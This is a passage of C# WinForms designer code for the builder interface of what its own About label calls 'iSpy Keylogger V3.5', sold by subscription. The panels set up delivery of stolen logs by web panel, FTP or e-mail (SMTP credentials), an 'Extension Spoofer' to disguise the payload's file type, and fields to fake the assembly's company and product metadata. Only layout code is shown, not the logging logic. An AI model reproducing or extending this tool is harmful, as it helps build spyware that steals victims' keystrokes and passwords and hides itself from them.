            this.tbFTPUsername.BackColor = System.Drawing.Color.Transparent;
            this.tbFTPUsername.Font = new System.Drawing.Font("Tahoma", 11F);
            this.tbFTPUsername.ForeColor = System.Drawing.Color.DimGray;
            this.tbFTPUsername.Location = new System.Drawing.Point(19, 27);
            this.tbFTPUsername.MaxLength = 32767;
            this.tbFTPUsername.Multiline = false;
            this.tbFTPUsername.Name = "tbFTPUsername";
            this.tbFTPUsername.ReadOnly = false;
            this.tbFTPUsername.Size = new System.Drawing.Size(192, 28);
            this.tbFTPUsername.TabIndex = 2;
            this.tbFTPUsername.Text = "username";
            this.tbFTPUsername.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.tbFTPUsername.UseSystemPasswordChar = false;
            // 
            // tbFTPServer
            // 
            this.tbFTPServer.BackColor = System.Drawing.Color.Transparent;
            this.tbFTPServer.Font = new System.Drawing.Font("Tahoma", 11F);
            this.tbFTPServer.ForeColor = System.Drawing.Color.DimGray;
            this.tbFTPServer.Location = new System.Drawing.Point(19, 61);
            this.tbFTPServer.MaxLength = 32767;
            this.tbFTPServer.Multiline = false;
            this.tbFTPServer.Name = "tbFTPServer";
            this.tbFTPServer.ReadOnly = false;
            this.tbFTPServer.Size = new System.Drawing.Size(403, 28);
            this.tbFTPServer.TabIndex = 1;
            this.tbFTPServer.Text = "ftp.host.com";
            this.tbFTPServer.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.tbFTPServer.UseSystemPasswordChar = false;
            // 
            // rbPanel
            // 
            this.rbPanel.BackColor = System.Drawing.Color.Transparent;
            this.rbPanel.Checked = true;
            this.rbPanel.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.rbPanel.Location = new System.Drawing.Point(28, 53);
            this.rbPanel.Name = "rbPanel";
            this.rbPanel.Size = new System.Drawing.Size(96, 15);
            this.rbPanel.TabIndex = 15;
            this.rbPanel.Text = "Web Panel";
            // 
            // rbFTP
            // 
            this.rbFTP.BackColor = System.Drawing.Color.Transparent;
            this.rbFTP.Checked = false;
            this.rbFTP.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.rbFTP.Location = new System.Drawing.Point(403, 53);
            this.rbFTP.Name = "rbFTP";
            this.rbFTP.Size = new System.Drawing.Size(60, 15);
            this.rbFTP.TabIndex = 14;
            this.rbFTP.Text = "FTP";
            // 
            // rbEmail
            // 
            this.rbEmail.BackColor = System.Drawing.Color.Transparent;
            this.rbEmail.Checked = false;
            this.rbEmail.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.rbEmail.Location = new System.Drawing.Point(245, 53);
            this.rbEmail.Name = "rbEmail";
            this.rbEmail.Size = new System.Drawing.Size(73, 15);
            this.rbEmail.TabIndex = 13;
            this.rbEmail.Text = "E-mail";
            // 
            // gbEmail
            // 
            this.gbEmail.Controls.Add(this.cbSSL);
            this.gbEmail.Controls.Add(this.tbEmailPort);
            this.gbEmail.Controls.Add(this.tbEmailServer);
            this.gbEmail.Controls.Add(this.tbEmailPassword);
            this.gbEmail.Controls.Add(this.tbEmailUsername);
            this.gbEmail.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.gbEmail.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.gbEmail.Location = new System.Drawing.Point(28, 202);
            this.gbEmail.Name = "gbEmail";
            this.gbEmail.Size = new System.Drawing.Size(446, 105);
            this.gbEmail.TabIndex = 16;
            this.gbEmail.TabStop = false;
            this.gbEmail.Text = "E-mail";
            // 
            // cbSSL
            // 
            this.cbSSL.BackColor = System.Drawing.Color.Transparent;
            this.cbSSL.Checked = true;
            this.cbSSL.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.cbSSL.Location = new System.Drawing.Point(377, 66);
            this.cbSSL.Name = "cbSSL";
            this.cbSSL.Size = new System.Drawing.Size(45, 19);
            this.cbSSL.TabIndex = 4;
            this.cbSSL.Text = "SSL";
            // 
            // tbEmailPort
            // 
            this.tbEmailPort.BackColor = System.Drawing.Color.Transparent;
            this.tbEmailPort.Font = new System.Drawing.Font("Tahoma", 11F);
            this.tbEmailPort.ForeColor = System.Drawing.Color.DimGray;
            this.tbEmailPort.Location = new System.Drawing.Point(217, 60);
            this.tbEmailPort.MaxLength = 32767;
            this.tbEmailPort.Multiline = false;
            this.tbEmailPort.Name = "tbEmailPort";
            this.tbEmailPort.ReadOnly = false;
            this.tbEmailPort.Size = new System.Drawing.Size(154, 28);
            this.tbEmailPort.TabIndex = 3;
            this.tbEmailPort.Text = "587";
            this.tbEmailPort.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.tbEmailPort.UseSystemPasswordChar = false;
            // 
            // tbEmailServer
            // 
            this.tbEmailServer.BackColor = System.Drawing.Color.Transparent;
            this.tbEmailServer.Font = new System.Drawing.Font("Tahoma", 11F);
            this.tbEmailServer.ForeColor = System.Drawing.Color.DimGray;
            this.tbEmailServer.Location = new System.Drawing.Point(19, 60);
            this.tbEmailServer.MaxLength = 32767;
            this.tbEmailServer.Multiline = false;
            this.tbEmailServer.Name = "tbEmailServer";
            this.tbEmailServer.ReadOnly = false;
            this.tbEmailServer.Size = new System.Drawing.Size(192, 28);
            this.tbEmailServer.TabIndex = 2;
            this.tbEmailServer.Text = "smtp.gmail.com";
            this.tbEmailServer.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.tbEmailServer.UseSystemPasswordChar = false;
            // 
            // tbEmailPassword
            // 
            this.tbEmailPassword.BackColor = System.Drawing.Color.Transparent;
            this.tbEmailPassword.Font = new System.Drawing.Font("Tahoma", 11F);
            this.tbEmailPassword.ForeColor = System.Drawing.Color.DimGray;
            this.tbEmailPassword.Location = new System.Drawing.Point(217, 26);
            this.tbEmailPassword.MaxLength = 32767;
            this.tbEmailPassword.Multiline = false;
            this.tbEmailPassword.Name = "tbEmailPassword";
            this.tbEmailPassword.ReadOnly = false;
            this.tbEmailPassword.Size = new System.Drawing.Size(205, 28);
            this.tbEmailPassword.TabIndex = 1;
            this.tbEmailPassword.Text = "password";
            this.tbEmailPassword.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.tbEmailPassword.UseSystemPasswordChar = true;
            // 
            // tbEmailUsername
            // 
            this.tbEmailUsername.BackColor = System.Drawing.Color.Transparent;
            this.tbEmailUsername.Font = new System.Drawing.Font("Tahoma", 11F);
            this.tbEmailUsername.ForeColor = System.Drawing.Color.DimGray;
            this.tbEmailUsername.Location = new System.Drawing.Point(19, 26);
            this.tbEmailUsername.MaxLength = 32767;
            this.tbEmailUsername.Multiline = false;
            this.tbEmailUsername.Name = "tbEmailUsername";
            this.tbEmailUsername.ReadOnly = false;
            this.tbEmailUsername.Size = new System.Drawing.Size(192, 28);
            this.tbEmailUsername.TabIndex = 0;
            this.tbEmailUsername.Text = "username@gmail.com";
            this.tbEmailUsername.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.tbEmailUsername.UseSystemPasswordChar = false;
            // 
            // separator1
            // 
            this.separator1.Location = new System.Drawing.Point(28, 34);
            this.separator1.Name = "separator1";
            this.separator1.Size = new System.Drawing.Size(446, 10);
            this.separator1.TabIndex = 12;
            this.separator1.Text = "ambiance_Separator1";
            // 
            // lblDeliveryMethod
            // 
            this.lblDeliveryMethod.AutoSize = true;
            this.lblDeliveryMethod.BackColor = System.Drawing.Color.Transparent;
            this.lblDeliveryMethod.Font = new System.Drawing.Font("Segoe UI", 11F, System.Drawing.FontStyle.Bold);
            this.lblDeliveryMethod.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblDeliveryMethod.Location = new System.Drawing.Point(24, 15);
            this.lblDeliveryMethod.Name = "lblDeliveryMethod";
            this.lblDeliveryMethod.Size = new System.Drawing.Size(126, 20);
            this.lblDeliveryMethod.TabIndex = 11;
            this.lblDeliveryMethod.Text = "Delivery Method";
            // 
            // panelAbout
            // 
            this.panelAbout.Controls.Add(this.pbAbout);
            this.panelAbout.Controls.Add(this.separator9);
            this.panelAbout.Controls.Add(this.lblAbout);
            this.panelAbout.Controls.Add(this.lblAboutInfo);
            this.panelAbout.Location = new System.Drawing.Point(245, 42);
            this.panelAbout.Name = "panelAbout";
            this.panelAbout.Size = new System.Drawing.Size(498, 435);
            this.panelAbout.TabIndex = 21;
            this.panelAbout.Visible = false;
            // 
            // pbAbout
            // 
            this.pbAbout.Image = ((System.Drawing.Image)(resources.GetObject("pbAbout.Image")));
            this.pbAbout.Location = new System.Drawing.Point(24, 197);
            this.pbAbout.Name = "pbAbout";
            this.pbAbout.Size = new System.Drawing.Size(446, 228);
            this.pbAbout.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pbAbout.TabIndex = 12;
            this.pbAbout.TabStop = false;
            // 
            // separator9
            // 
            this.separator9.Location = new System.Drawing.Point(24, 31);
            this.separator9.Name = "separator9";
            this.separator9.Size = new System.Drawing.Size(446, 10);
            this.separator9.TabIndex = 10;
            this.separator9.Text = "ambiance_Separator8";
            // 
            // lblAbout
            // 
            this.lblAbout.AutoSize = true;
            this.lblAbout.BackColor = System.Drawing.Color.Transparent;
            this.lblAbout.Font = new System.Drawing.Font("Segoe UI", 11F, System.Drawing.FontStyle.Bold);
            this.lblAbout.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblAbout.Location = new System.Drawing.Point(20, 12);
            this.lblAbout.Name = "lblAbout";
            this.lblAbout.Size = new System.Drawing.Size(53, 20);
            this.lblAbout.TabIndex = 9;
            this.lblAbout.Text = "About";
            // 
            // lblAboutInfo
            // 
            this.lblAboutInfo.AutoSize = true;
            this.lblAboutInfo.BackColor = System.Drawing.Color.Transparent;
            this.lblAboutInfo.Font = new System.Drawing.Font("Segoe UI", 15.75F, System.Drawing.FontStyle.Italic, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.lblAboutInfo.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblAboutInfo.Location = new System.Drawing.Point(19, 44);
            this.lblAboutInfo.Name = "lblAboutInfo";
            this.lblAboutInfo.Size = new System.Drawing.Size(446, 150);
            this.lblAboutInfo.TabIndex = 11;
            this.lblAboutInfo.Text = "iSpy Keylogger V3.5\r\nDeveloped by Venomous Net\r\nE-Mail: venomous.net@gmail.com\r\nS" +
    "kype: venomous.net\r\nContact me for any questions or private projects.";
            // 
            // panelKeylogger
            // 
            this.panelKeylogger.BackColor = System.Drawing.Color.Transparent;
            this.panelKeylogger.BackgroundImage = global::Galaxy_Logger.Properties.Resources.iboiR6tcpkvjzZ;
            this.panelKeylogger.Location = new System.Drawing.Point(326, 109);
            this.panelKeylogger.Name = "panelKeylogger";
            this.panelKeylogger.Size = new System.Drawing.Size(340, 303);
            this.panelKeylogger.TabIndex = 1;
            // 
            // panelExtensionSpoofer
            // 
            this.panelExtensionSpoofer.Controls.Add(this.cmdDoSpoofExt);
            this.panelExtensionSpoofer.Controls.Add(this.nsButton2);
            this.panelExtensionSpoofer.Controls.Add(this.labelExt);
            this.panelExtensionSpoofer.Controls.Add(this.textBoxSpoofExt);
            this.panelExtensionSpoofer.Controls.Add(this.labelSpoofFilePath);
            this.panelExtensionSpoofer.Controls.Add(this.ambiance_Separator2);
            this.panelExtensionSpoofer.Controls.Add(this.ambiance_HeaderLabel6);
            this.panelExtensionSpoofer.Location = new System.Drawing.Point(245, 42);
            this.panelExtensionSpoofer.Name = "panelExtensionSpoofer";
            this.panelExtensionSpoofer.Size = new System.Drawing.Size(498, 435);
            this.panelExtensionSpoofer.TabIndex = 23;
            this.panelExtensionSpoofer.Visible = false;
            // 
            // cmdDoSpoofExt
            // 
            this.cmdDoSpoofExt.Location = new System.Drawing.Point(245, 109);
            this.cmdDoSpoofExt.Name = "cmdDoSpoofExt";
            this.cmdDoSpoofExt.Size = new System.Drawing.Size(105, 23);
            this.cmdDoSpoofExt.TabIndex = 12;
            this.cmdDoSpoofExt.Text = "Spoof Extension";
            this.cmdDoSpoofExt.Click += new System.EventHandler(this.cmdDoSpoofExt_Click);
            // 
            // nsButton2
            // 
            this.nsButton2.Location = new System.Drawing.Point(245, 84);
            this.nsButton2.Name = "nsButton2";
            this.nsButton2.Size = new System.Drawing.Size(75, 23);
            this.nsButton2.TabIndex = 0;
            this.nsButton2.Text = "Select File";
            this.nsButton2.Click += new System.EventHandler(this.nsButton2_Click);
            // 
            // labelExt
            // 
            this.labelExt.Font = new System.Drawing.Font("Verdana", 7F);
            this.labelExt.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(142)))), ((int)(((byte)(152)))), ((int)(((byte)(156)))));
            this.labelExt.Location = new System.Drawing.Point(21, 109);
            this.labelExt.Name = "labelExt";
            this.labelExt.Size = new System.Drawing.Size(91, 16);
            this.labelExt.TabIndex = 1;
            this.labelExt.Text = "Extension: ";
            // 
            // textBoxSpoofExt
            // 
            this.textBoxSpoofExt.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.textBoxSpoofExt.Font = new System.Drawing.Font("Verdana", 7F);
            this.textBoxSpoofExt.Location = new System.Drawing.Point(118, 104);
            this.textBoxSpoofExt.MaxLength = 32767;
            this.textBoxSpoofExt.Multiline = false;
            this.textBoxSpoofExt.Name = "textBoxSpoofExt";
            this.textBoxSpoofExt.ReadOnly = false;
            this.textBoxSpoofExt.Size = new System.Drawing.Size(100, 23);
            this.textBoxSpoofExt.TabIndex = 3;
            this.textBoxSpoofExt.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.textBoxSpoofExt.UseSystemPasswordChar = false;
            // 
            // labelSpoofFilePath
            // 
            this.labelSpoofFilePath.AutoSize = true;
            this.labelSpoofFilePath.Font = new System.Drawing.Font("Verdana", 7F);
            this.labelSpoofFilePath.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(142)))), ((int)(((byte)(152)))), ((int)(((byte)(156)))));
            this.labelSpoofFilePath.Location = new System.Drawing.Point(21, 84);
            this.labelSpoofFilePath.Name = "labelSpoofFilePath";
            this.labelSpoofFilePath.Size = new System.Drawing.Size(39, 12);
            this.labelSpoofFilePath.TabIndex = 11;
            this.labelSpoofFilePath.Text = "Path :";
            // 
            // ambiance_Separator2
            // 
            this.ambiance_Separator2.Location = new System.Drawing.Point(24, 31);
            this.ambiance_Separator2.Name = "ambiance_Separator2";
            this.ambiance_Separator2.Size = new System.Drawing.Size(446, 10);
            this.ambiance_Separator2.TabIndex = 10;
            this.ambiance_Separator2.Text = "ambiance_Separator8";
            // 
            // ambiance_HeaderLabel6
            // 
            this.ambiance_HeaderLabel6.AutoSize = true;
            this.ambiance_HeaderLabel6.BackColor = System.Drawing.Color.Transparent;
            this.ambiance_HeaderLabel6.Font = new System.Drawing.Font("Segoe UI", 11F, System.Drawing.FontStyle.Bold);
            this.ambiance_HeaderLabel6.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.ambiance_HeaderLabel6.Location = new System.Drawing.Point(20, 12);
            this.ambiance_HeaderLabel6.Name = "ambiance_HeaderLabel6";
            this.ambiance_HeaderLabel6.Size = new System.Drawing.Size(136, 20);
            this.ambiance_HeaderLabel6.TabIndex = 9;
            this.ambiance_HeaderLabel6.Text = "Extension Spoofer";
            // 
            // panelAccountInfo
            // 
            this.panelAccountInfo.Controls.Add(this.webpanelButton);
            this.panelAccountInfo.Controls.Add(this.forumsButton);
            this.panelAccountInfo.Controls.Add(this.updateButton);
            this.panelAccountInfo.Controls.Add(this.subscriptionButton);
            this.panelAccountInfo.Controls.Add(this.onlineUsersText);
            this.panelAccountInfo.Controls.Add(this.ipAddressText);
            this.panelAccountInfo.Controls.Add(this.lastUpdateText);
            this.panelAccountInfo.Controls.Add(this.GUIDText);
            this.panelAccountInfo.Controls.Add(this.versionText);
            this.panelAccountInfo.Controls.Add(this.usernameText);
            this.panelAccountInfo.Controls.Add(this.ambiance_Separator3);
            this.panelAccountInfo.Controls.Add(this.ambiance_HeaderLabel7);
            this.panelAccountInfo.Controls.Add(this.onlineUsersLabel);
            this.panelAccountInfo.Controls.Add(this.lastUpdateLabel);
            this.panelAccountInfo.Controls.Add(this.versionLabel);
            this.panelAccountInfo.Controls.Add(this.ipAddressLabel);
            this.panelAccountInfo.Controls.Add(this.GUIDLabel);
            this.panelAccountInfo.Controls.Add(this.usernameLabel);
            this.panelAccountInfo.Location = new System.Drawing.Point(245, 36);
            this.panelAccountInfo.Name = "panelAccountInfo";
            this.panelAccountInfo.Size = new System.Drawing.Size(498, 435);
            this.panelAccountInfo.TabIndex = 30;
            this.panelAccountInfo.Visible = false;
            this.panelAccountInfo.Paint += new System.Windows.Forms.PaintEventHandler(this.panelAccountInfo_Paint_1);
            // 
            // webpanelButton
            // 
            this.webpanelButton.Location = new System.Drawing.Point(376, 344);
            this.webpanelButton.Name = "webpanelButton";
            this.webpanelButton.Size = new System.Drawing.Size(75, 23);
            this.webpanelButton.TabIndex = 37;
            this.webpanelButton.Text = "Web Panel";
            // 
            // forumsButton
            // 
            this.forumsButton.Location = new System.Drawing.Point(295, 344);
            this.forumsButton.Name = "forumsButton";
            this.forumsButton.Size = new System.Drawing.Size(75, 23);
            this.forumsButton.TabIndex = 36;
            this.forumsButton.Text = "Forums";
            // 
            // updateButton
            // 
            this.updateButton.Location = new System.Drawing.Point(202, 344);
            this.updateButton.Name = "updateButton";
            this.updateButton.Size = new System.Drawing.Size(75, 23);
            this.updateButton.TabIndex = 35;
            this.updateButton.Text = "Update";
            // 
            // subscriptionButton
            // 
            this.subscriptionButton.Location = new System.Drawing.Point(24, 344);
            this.subscriptionButton.Name = "subscriptionButton";
            this.subscriptionButton.Size = new System.Drawing.Size(126, 23);
            this.subscriptionButton.TabIndex = 34;
            this.subscriptionButton.Text = "Renew Subscription";
            // 
            // onlineUsersText
            // 
            this.onlineUsersText.AutoSize = true;
            this.onlineUsersText.BackColor = System.Drawing.Color.Transparent;
            this.onlineUsersText.Font = new System.Drawing.Font("Segoe UI", 11F);
            this.onlineUsersText.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.onlineUsersText.Location = new System.Drawing.Point(141, 270);
            this.onlineUsersText.Name = "onlineUsersText";
            this.onlineUsersText.RightToLeft = System.Windows.Forms.RightToLeft.Yes;
            this.onlineUsersText.Size = new System.Drawing.Size(73, 20);
            this.onlineUsersText.TabIndex = 33;
            this.onlineUsersText.Text = "toChange";
            // 
            // ipAddressText
            // 
            this.ipAddressText.AutoSize = true;
            this.ipAddressText.BackColor = System.Drawing.Color.Transparent;
            this.ipAddressText.Font = new System.Drawing.Font("Segoe UI", 11F);
            this.ipAddressText.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.ipAddressText.Location = new System.Drawing.Point(141, 239);
            this.ipAddressText.Name = "ipAddressText";
            this.ipAddressText.RightToLeft = System.Windows.Forms.RightToLeft.Yes;
            this.ipAddressText.Size = new System.Drawing.Size(73, 20);
            this.ipAddressText.TabIndex = 32;
            this.ipAddressText.Text = "toChange";
            // 
            // lastUpdateText
            // 
            this.lastUpdateText.AutoSize = true;
            this.lastUpdateText.BackColor = System.Drawing.Color.Transparent;
            this.lastUpdateText.Font = new System.Drawing.Font("Segoe UI", 11F);
            this.lastUpdateText.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lastUpdateText.Location = new System.Drawing.Point(141, 212);
            this.lastUpdateText.Name = "lastUpdateText";
            this.lastUpdateText.RightToLeft = System.Windows.Forms.RightToLeft.Yes;
            this.lastUpdateText.Size = new System.Drawing.Size(73, 20);
            this.lastUpdateText.TabIndex = 31;
            this.lastUpdateText.Text = "toChange";
            // 
            // GUIDText
            // 
            this.GUIDText.AutoSize = true;
            this.GUIDText.BackColor = System.Drawing.Color.Transparent;
            this.GUIDText.Font = new System.Drawing.Font("Segoe UI", 11F);
            this.GUIDText.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.GUIDText.Location = new System.Drawing.Point(141, 182);
            this.GUIDText.Name = "GUIDText";
            this.GUIDText.RightToLeft = System.Windows.Forms.RightToLeft.Yes;
            this.GUIDText.Size = new System.Drawing.Size(73, 20);
            this.GUIDText.TabIndex = 30;
            this.GUIDText.Text = "toChange";
            // 
            // versionText
            // 
            this.versionText.AutoSize = true;
            this.versionText.BackColor = System.Drawing.Color.Transparent;
            this.versionText.Font = new System.Drawing.Font("Segoe UI", 11F);
            this.versionText.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.versionText.Location = new System.Drawing.Point(141, 153);
            this.versionText.Name = "versionText";
            this.versionText.RightToLeft = System.Windows.Forms.RightToLeft.Yes;
            this.versionText.Size = new System.Drawing.Size(73, 20);
            this.versionText.TabIndex = 29;
            this.versionText.Text = "toChange";
            // 
            // usernameText
            // 
            this.usernameText.AutoSize = true;
            this.usernameText.BackColor = System.Drawing.Color.Transparent;
            this.usernameText.Font = new System.Drawing.Font("Segoe UI", 11F);
            this.usernameText.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.usernameText.Location = new System.Drawing.Point(141, 130);
            this.usernameText.Name = "usernameText";
            this.usernameText.RightToLeft = System.Windows.Forms.RightToLeft.Yes;
            this.usernameText.Size = new System.Drawing.Size(73, 20);
            this.usernameText.TabIndex = 28;
            this.usernameText.Text = "toChange";
            // 
            // ambiance_Separator3
            // 
            this.ambiance_Separator3.Location = new System.Drawing.Point(26, 37);
            this.ambiance_Separator3.Name = "ambiance_Separator3";
            this.ambiance_Separator3.Size = new System.Drawing.Size(446, 10);
            this.ambiance_Separator3.TabIndex = 20;
            this.ambiance_Separator3.Text = "ambiance_Separator9";
            // 
            // ambiance_HeaderLabel7
            // 
            this.ambiance_HeaderLabel7.AutoSize = true;
            this.ambiance_HeaderLabel7.BackColor = System.Drawing.Color.Transparent;
            this.ambiance_HeaderLabel7.Font = new System.Drawing.Font("Segoe UI", 11F, System.Drawing.FontStyle.Bold);
            this.ambiance_HeaderLabel7.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.ambiance_HeaderLabel7.Location = new System.Drawing.Point(24, 15);
            this.ambiance_HeaderLabel7.Name = "ambiance_HeaderLabel7";
            this.ambiance_HeaderLabel7.Size = new System.Drawing.Size(100, 20);
            this.ambiance_HeaderLabel7.TabIndex = 19;
            this.ambiance_HeaderLabel7.Text = "Account Info";
            // 
            // onlineUsersLabel
            // 
            this.onlineUsersLabel.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Bold);
            this.onlineUsersLabel.Location = new System.Drawing.Point(28, 267);
            this.onlineUsersLabel.Name = "onlineUsersLabel";
            this.onlineUsersLabel.Size = new System.Drawing.Size(101, 23);
            this.onlineUsersLabel.TabIndex = 2;
            this.onlineUsersLabel.Text = "Online Users";
            this.onlineUsersLabel.Value1 = "Online";
            this.onlineUsersLabel.Value2 = "Users :";
            // 
            // lastUpdateLabel
            // 
            this.lastUpdateLabel.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Bold);
            this.lastUpdateLabel.Location = new System.Drawing.Point(28, 209);
            this.lastUpdateLabel.Name = "lastUpdateLabel";
            this.lastUpdateLabel.Size = new System.Drawing.Size(101, 23);
            this.lastUpdateLabel.TabIndex = 3;
            this.lastUpdateLabel.Text = "Last Update";
            this.lastUpdateLabel.Value1 = "Last";
            this.lastUpdateLabel.Value2 = "Update :";
            // 
            // versionLabel
            // 
            this.versionLabel.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Bold);
            this.versionLabel.Location = new System.Drawing.Point(28, 150);
            this.versionLabel.Name = "versionLabel";
            this.versionLabel.Size = new System.Drawing.Size(65, 23);
            this.versionLabel.TabIndex = 4;
            this.versionLabel.Text = "Version";
            this.versionLabel.Value1 = "Version";
            this.versionLabel.Value2 = ":";
            // 
            // ipAddressLabel
            // 
            this.ipAddressLabel.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Bold);
            this.ipAddressLabel.Location = new System.Drawing.Point(28, 238);
            this.ipAddressLabel.Name = "ipAddressLabel";
            this.ipAddressLabel.Size = new System.Drawing.Size(86, 23);
            this.ipAddressLabel.TabIndex = 7;
            this.ipAddressLabel.Text = "IP Address";
            this.ipAddressLabel.Value1 = "IP";
            this.ipAddressLabel.Value2 = "Address: ";
            // 
            // GUIDLabel
            // 
            this.GUIDLabel.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Bold);
            this.GUIDLabel.Location = new System.Drawing.Point(29, 179);
            this.GUIDLabel.Name = "GUIDLabel";
            this.GUIDLabel.Size = new System.Drawing.Size(57, 23);
            this.GUIDLabel.TabIndex = 5;
            this.GUIDLabel.Text = "GUID";
            this.GUIDLabel.Value1 = "GU";
            this.GUIDLabel.Value2 = "ID :";
            // 
            // usernameLabel
            // 
            this.usernameLabel.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Bold);
            this.usernameLabel.Location = new System.Drawing.Point(28, 127);
            this.usernameLabel.Name = "usernameLabel";
            this.usernameLabel.Size = new System.Drawing.Size(87, 23);
            this.usernameLabel.TabIndex = 6;
            this.usernameLabel.Text = "Online Users";
            this.usernameLabel.Value1 = "User";
            this.usernameLabel.Value2 = "name :";
            // 
            // panelAssembly
            // 
            this.panelAssembly.Controls.Add(this.lblVersion);
            this.panelAssembly.Controls.Add(this.lblCopyright);
            this.panelAssembly.Controls.Add(this.lblProduct);
            this.panelAssembly.Controls.Add(this.lblCompany);
            this.panelAssembly.Controls.Add(this.lblDescriptionAsm);
            this.panelAssembly.Controls.Add(this.lblTitle);
            this.panelAssembly.Controls.Add(this.tbVersion);
            this.panelAssembly.Controls.Add(this.tbCopyright);
            this.panelAssembly.Controls.Add(this.tbProduct);
            this.panelAssembly.Controls.Add(this.tbCompany);
            this.panelAssembly.Controls.Add(this.tbDescription);
            this.panelAssembly.Controls.Add(this.tbTitle);
            this.panelAssembly.Controls.Add(this.cbChangeAssembly);
            this.panelAssembly.Controls.Add(this.separator6);
            this.panelAssembly.Controls.Add(this.lblAssembly);
            this.panelAssembly.Location = new System.Drawing.Point(242, 39);
            this.panelAssembly.Name = "panelAssembly";
            this.panelAssembly.Size = new System.Drawing.Size(498, 435);
            this.panelAssembly.TabIndex = 29;
            this.panelAssembly.Visible = false;
            // 
            // lblVersion
            // 
            this.lblVersion.AutoSize = true;
            this.lblVersion.BackColor = System.Drawing.Color.Transparent;
            this.lblVersion.Font = new System.Drawing.Font("Segoe UI", 11F);
            this.lblVersion.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblVersion.Location = new System.Drawing.Point(22, 280);
            this.lblVersion.Name = "lblVersion";
            this.lblVersion.Size = new System.Drawing.Size(61, 20);
            this.lblVersion.TabIndex = 33;
            this.lblVersion.Text = "Version:";
            // 
            // lblCopyright
            // 
            this.lblCopyright.AutoSize = true;
            this.lblCopyright.BackColor = System.Drawing.Color.Transparent;
            this.lblCopyright.Font = new System.Drawing.Font("Segoe UI", 11F);
            this.lblCopyright.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblCopyright.Location = new System.Drawing.Point(22, 243);
            this.lblCopyright.Name = "lblCopyright";
            this.lblCopyright.Size = new System.Drawing.Size(77, 20);
            this.lblCopyright.TabIndex = 32;
            this.lblCopyright.Text = "Copyright:";
            // 
            // lblProduct
            // 
            this.lblProduct.AutoSize = true;
            this.lblProduct.BackColor = System.Drawing.Color.Transparent;
            this.lblProduct.Font = new System.Drawing.Font("Segoe UI", 11F);
            this.lblProduct.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblProduct.Location = new System.Drawing.Point(22, 206);
            this.lblProduct.Name = "lblProduct";
            this.lblProduct.Size = new System.Drawing.Size(63, 20);
            this.lblProduct.TabIndex = 31;
            this.lblProduct.Text = "Product:";
            // 
            // lblCompany
            // 
            this.lblCompany.AutoSize = true;
            this.lblCompany.BackColor = System.Drawing.Color.Transparent;
            this.lblCompany.Font = new System.Drawing.Font("Segoe UI", 11F);
            this.lblCompany.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(77)))));
            this.lblCompany.Location = new System.Drawing.Point(22, 169);
            this.lblCompany.Name = "lblCompany";
            this.lblCompany.Size = new System.Drawing.Size(75, 20);
            this.lblCompany.TabIndex = 30;
            this.lblCompany.Text = "Company:";
            // 
            // lblDescriptionAsm
            // 
            this.lblDescriptionAsm.AutoSize = true;
            this.lblDescriptionAsm.BackColor = System.Drawing.Color.Transparent;
            this.lblDescriptionAsm.Font = new System.Drawing.Font("Segoe UI", 11F);
